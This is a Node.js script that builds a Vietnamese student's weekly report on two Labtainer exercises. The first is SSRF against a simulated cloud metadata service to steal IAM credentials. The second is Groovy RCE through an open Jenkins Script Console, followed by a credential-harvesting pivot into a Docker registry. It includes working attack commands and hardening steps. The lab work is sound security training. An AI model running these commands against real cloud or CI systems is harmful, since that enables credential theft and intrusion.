// Bao cao tuan 4: Lab 7 (cloud-ssrf-imds) + Lab 8 (dso-cicd-jenkins)
const path = require('path');
const { render, makeC } = require('./engine');
const { C, h1, h2, h3, p, b, code, img, table } = makeC();

const VM = '192.168.17.144';
const NAM = 'Lê Thành Nam - B22DCAT202';
const EMAIL = 'namlt.b22at202@stu.ptit.edu.vn';

h1('TỔNG QUAN NỘI DUNG TUẦN 4');
h2('Mục tiêu');
p('Trong tuần 4, nhóm thực hiện hai bài thực hành tiếp theo trên môi trường Labtainer, đóng vai trò sinh viên làm bài từ đầu đến cuối: khởi động bài lab, lần lượt chạy đúng từng dòng lệnh trong hướng dẫn, lấy flag và chấm điểm tự động bằng `checkwork`. Toàn bộ quá trình được chụp ảnh màn hình làm minh chứng.');
h2('Phân công thực hiện');
table(['STT', 'Bài thực hành', 'Mã lab', 'Người thực hiện'], [700, 3700, 2000, 3068], [
  ['7', 'SSRF truy cập Instance Metadata (IMDS)', 'cloud-ssrf-imds', NAM],
  ['8', 'Khai thác CI/CD Jenkins & pivot Registry', 'dso-cicd-jenkins', NAM],
]);
h2('Môi trường thực hiện');
b('Máy ảo Labtainer (VMware): Ubuntu, Docker; các bài lab chạy trong các container cô lập, offline khi làm bài.',
  `Truy cập giao diện đồ họa của máy ảo trực tiếp trên trình duyệt web qua noVNC (cổng 6080, \`http://${VM}:6080/vnc.html\`).`,
  'Mỗi sinh viên khởi động lab bằng email riêng; Labtainer dùng email này để sinh flag/khóa cá thể hóa (HASH_REPLACE).');

// ---------------- LAB 7 ----------------
h1('BÀI THỰC HÀNH 7: SSRF TRUY CẬP INSTANCE METADATA (CLOUD-SSRF-IMDS)');
p('Người thực hiện: ' + NAM + ' (email khởi động lab: ' + EMAIL + ').');
h2('Mục đích');
b('Hiểu lỗ hổng SSRF (Server-Side Request Forgery): ép máy chủ web gửi request tới dịch vụ nội bộ mà attacker không truy cập trực tiếp được.',
  'Khai thác SSRF để truy cập Instance Metadata Service (IMDS) và đánh cắp credential tạm thời của IAM role (MITRE T1552.005).',
  'Dùng credential đánh cắp để truy cập object storage lấy flag; sau đó khắc phục nhiều lớp: bật IMDSv2, allowlist trên webapp, và least privilege.');
h2('Môi trường bài lab');
b('Container `client` (có terminal): máy attacker, cài sẵn `curl`, `aws-cli`, `jq`.',
  'Container `web` (không có terminal): ứng dụng có endpoint `/fetch?url=` dính SSRF.',
  'Container `imds` (không có terminal): mô phỏng IMDS, cấp credential tạm thời của role `web-imgproxy-role`. Container `storage` (MinIO) chứa flag trong bucket `fin-reports`.');
h2('Nội dung thực hành');
h3('Khởi động bài lab');
code('labtainer -r cloud-ssrf-imds');
img('l7_01_start.jpg', 'Khởi động bài lab cloud-ssrf-imds và mở terminal container client');
h3('Nhiệm vụ 1 & 2 - Phát hiện SSRF và đánh cắp credential IMDS');
p('Dùng endpoint SSRF để truy cập IMDS nội bộ, liệt kê role và lấy credential tạm thời:');
code('curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/"\nROLE=$(curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/")\ncurl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/$ROLE" | tee ~/creds.txt');
img('l7_02_ssrf.jpg', 'SSRF truy cập IMDS, đánh cắp credential tạm thời của role web-imgproxy-role');
h3('Nhiệm vụ 3 - Dùng credential đánh cắp lấy flag từ storage');
code('export AWS_ACCESS_KEY_ID=$(...); export AWS_SECRET_ACCESS_KEY=$(...)\nunset AWS_SESSION_TOKEN; export AWS_DEFAULT_REGION=us-east-1\naws --endpoint-url http://storage:9000 s3 cp s3://fin-reports/flag.txt ./flag.txt\ncp ./flag.txt ~/loot.txt; cat ~/loot.txt');
img('l7_03_flag.jpg', 'Dùng credential IMDS đánh cắp truy cập bucket fin-reports, lấy flag 1abf1851b680c989');
h3('Nhiệm vụ 4 - Khắc phục nhiều lớp (IMDSv2, allowlist, least privilege)');
p('Bật IMDSv2 (bắt buộc token PUT trước GET), bật allowlist chặn SSRF tới imds trên webapp, và ghi tài liệu least privilege:');
code('curl -s -X POST http://imds/admin/enable-imdsv2\ncurl -s -X POST http://web:8080/admin/harden\ncurl -s -o /dev/null -w "%{http_code}" "http://web:8080/fetch?url=http://imds/latest/meta-data/"');
img('l7_04_harden.jpg', 'Sau hardening: SSRF GET không còn credential (IMDSv2), request tới imds bị chặn 403 (allowlist)');
h2('Kết quả thực hiện');
img('l7_05_checkwork.jpg', 'Kết quả chấm điểm tự động bài cloud-ssrf-imds: 10/10 mục tiêu đạt (Y)');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['g_discover_ssrf', 'Phát hiện SSRF tới mục tiêu nội bộ', 'Y'],
  ['g_steal_credentials', 'Đánh cắp credential IMDS qua SSRF', 'Y'],
  ['g_access_storage_get_flag', 'Dùng credential lấy flag', 'Y'],
  ['g_harden_ssrf_imds', 'Khắc phục: IMDSv2 + allowlist', 'Y'],
  ['r_discover_ssrf ... r_remediation_ok', '6 result phụ (đường dẫn SSRF, loot, chặn, IMDSv2, remediation)', 'Y'],
]);
p('Kết quả: hoàn thành 10/10 mục tiêu (4 goal + 6 result); flag `1abf1851b680c989`.');

// ---------------- LAB 8 ----------------
h1('BÀI THỰC HÀNH 8: KHAI THÁC CI/CD JENKINS & PIVOT REGISTRY (DSO-CICD-JENKINS)');
p('Người thực hiện: ' + NAM + ' (email khởi động lab: ' + EMAIL + ').');
h2('Mục đích');
b('Nhận diện Jenkins cấu hình sai (cho phép truy cập ẩn danh, Script Console mở) - tương đương RCE toàn quyền trên máy CI.',
  'Khai thác Script Console để thực thi Groovy, đọc flag và thu thập credential registry lộ trong log build.',
  'Pivot: dùng credential đánh cắp xác thực vào Docker Registry nội bộ, tải layer image và trích flag (MITRE T1078); sau đó hardening Jenkins (bật xác thực, thu hồi quyền ẩn danh).');
h2('Môi trường bài lab');
b('Container `client` (có terminal): máy attacker, cài sẵn `curl`, `jq`, `tar`.',
  'Container `jenkins` (không có terminal): Jenkins LTS 2.462.3 thật, cấu hình sai cho phép anonymous + Script Console; job `build-app`.',
  'Container `registry` (không có terminal, 5000): Docker Registry v2 nội bộ, image `acme/app` chứa flag trong layer; credential `deployer` lộ trong log build.');
h2('Nội dung thực hành');
h3('Khởi động bài lab');
code('labtainer -r dso-cicd-jenkins');
img('l8_01_start.jpg', 'Khởi động bài lab dso-cicd-jenkins và mở terminal container client');
h3('Nhiệm vụ 1 & 2 - Trinh sát Jenkins và RCE Script Console');
code('curl -s -D - -o /dev/null http://jenkins:8080/ | grep -i X-Jenkins\ncurl -s --data-urlencode \'script=println "id".execute().text\' http://jenkins:8080/scriptText\ncurl -s --data-urlencode \'script=println new File("/var/jenkins_home/flag_ci.txt").text\' http://jenkins:8080/scriptText | tr -d \'\\r\\n \' | tee ~/flag_ci.txt');
img('l8_02_rce.jpg', 'Jenkins 2.462.3, Script Console RCE (uid=1000), đọc flag_ci 9b2c723ecd6344d3');
h3('Nhiệm vụ 3 - Thu thập credential registry từ log build');
code('curl -s "http://jenkins:8080/job/build-app/lastBuild/consoleText" | tee ~/buildlog.txt | grep -Ei \'deployer\'\ngrep -o \'\\-p [^ ]*\' ~/buildlog.txt | head -1 | awk \'{print $2}\' | tr -d \'\\r\\n\' | tee ~/regpass_loot.txt');
img('l8_03_creds.jpg', 'Trích mật khẩu registry (deployer) lộ trong console log của job build-app');
h3('Nhiệm vụ 4 - Pivot vào Docker Registry, trích flag từ layer');
code('RP=$(cat ~/regpass_loot.txt)\ncurl -s -u "deployer:$RP" http://registry:5000/v2/_catalog | jq\nMAN=$(curl -s -u "deployer:$RP" -H \'Accept: application/vnd.docker.distribution.manifest.v2+json\' http://registry:5000/v2/acme/app/manifests/1.0)\nDIG=$(echo "$MAN" | grep -o \'sha256:[0-9a-f]\\{64\\}\' | tail -1)\ncurl -s -u "deployer:$RP" "http://registry:5000/v2/acme/app/blobs/$DIG" -o ~/layer.tar\ntar -xzf ~/layer.tar && cat ~/flag_pivot.txt');
img('l8_04_pivot.jpg', 'Pivot vào registry bằng credential đánh cắp, tải layer, trích flag_pivot 5e622307a8d09bec');
h3('Nhiệm vụ 5 - Hardening Jenkins');
p('Dùng chính quyền RCE để bật xác thực và thu hồi quyền của người dùng ẩn danh (chỉ dùng API lõi Jenkins):');
code('curl -s --data-urlencode \'script=... setSecurityRealm(new HudsonPrivateSecurityRealm(false)); setAuthorizationStrategy(...); setAllowAnonymousRead(false) ...\' http://jenkins:8080/scriptText\ncurl -s -o /dev/null -w "%{http_code}" http://jenkins:8080/api/json');
img('l8_05_harden.jpg', 'Sau hardening: truy cập API và Script Console ẩn danh trả 403');
h2('Kết quả thực hiện');
img('l8_06_checkwork.jpg', 'Kết quả chấm điểm tự động bài dso-cicd-jenkins: 6/6 mục tiêu đạt (Y)');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['recon_jenkins', 'Trinh sát Jenkins (X-Jenkins, job)', 'Y'],
  ['rce_script_console', 'RCE qua Script Console (flag_ci)', 'Y'],
  ['harvest_creds', 'Thu thập credential registry', 'Y'],
  ['pivot_registry', 'Pivot registry, trích flag_pivot', 'Y'],
  ['harden_jenkins', 'Bật xác thực, chặn ẩn danh', 'Y'],
  ['lab_complete', 'Hoàn thành toàn bộ bài', 'Y'],
]);
p('Kết quả: hoàn thành 6/6 mục tiêu; flag_ci `9b2c723ecd6344d3`, flag_pivot `5e622307a8d09bec`.');

// ---------------- KET LUAN ----------------
h1('KẾT LUẬN');
h2('Kết quả đạt được');
b('Hoàn thành bài 7 (cloud-ssrf-imds): checkwork 10/10; khai thác SSRF đánh cắp credential IMDS, lấy flag và khắc phục nhiều lớp (IMDSv2, allowlist, least privilege).',
  'Hoàn thành bài 8 (dso-cicd-jenkins): checkwork 6/6; RCE qua Script Console trên Jenkins thật, pivot vào Docker Registry trích flag, và hardening Jenkins.',
  'Cả hai bài đều được thực hiện bằng cách sao chép đúng từng dòng lệnh trong hướng dẫn, xác nhận hướng dẫn chạy đúng và bài lab thực sự làm được.');

render(C, {
  imgDir: path.join(__dirname, 'anh4'),
  out: path.join(__dirname, '..', 'bao-cao-tuan-4', 'Bao-cao-tuan-4.docx'),
}).catch(e => { console.error(e); process.exit(1); });
